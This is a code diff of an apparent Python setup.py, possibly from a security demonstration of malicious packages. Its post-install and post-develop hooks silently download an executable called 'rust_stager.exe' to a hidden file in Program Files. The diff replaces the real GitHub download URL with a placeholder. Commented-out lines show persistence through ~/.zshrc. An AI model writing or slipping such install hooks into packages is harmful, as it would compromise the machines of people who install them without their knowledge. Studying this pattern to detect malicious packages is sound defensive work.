@@ -16,7 +16,7 @@ class PostDevelopCommand(develop):
         develop.run(self)
         import subprocess
         import urllib.request
-        urllib.request.urlretrieve("https://github.com/LivingInSyn/arrow_evil/releases/download/v1/rust_stager.exe", "C:\\Program Files\\.ohno.exe")
+        urllib.request.urlretrieve("https://example.com.replaceme", "C:\\Program Files\\.ohno.exe")
         #subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
         # with open('~/.zshrc', 'a') as f:
         #     f.write('/Users/Shared/.ohno\n')
@@ -28,7 +28,7 @@ class PostInstallCommand(install):
         install.run(self)
         import subprocess
         import urllib.request
-        urllib.request.urlretrieve("https://github.com/LivingInSyn/arrow_evil/releases/download/v1/rust_stager.exe", "C:\\Program Files\\.ohno.exe")
+        urllib.request.urlretrieve("https://example.com.replaceme", "C:\\Program Files\\.ohno.exe")
         #subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
         # with open('~/.zshrc', 'a') as f:
         #     f.write('/Users/Shared/.ohno\n')
